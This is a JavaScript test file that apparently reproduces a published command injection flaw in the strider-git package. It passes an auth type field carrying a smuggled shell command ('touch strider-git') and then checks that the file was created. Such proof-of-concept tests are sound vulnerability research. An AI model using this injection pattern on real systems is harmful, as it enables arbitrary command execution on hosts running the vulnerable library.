//https://snyk.io/vuln/SNYK-JS-STRIDERGIT-572913
test("Command Injection in strider-git", () => 
{
	const git = require("strider-git/lib");
	const fs = require('fs');
	const path = './strider-git';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	git.getBranches({auth:{type:'ssaas;touch strider-git; ', privkey:'sss'}, url:'http://sss'}, '', function(){})
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});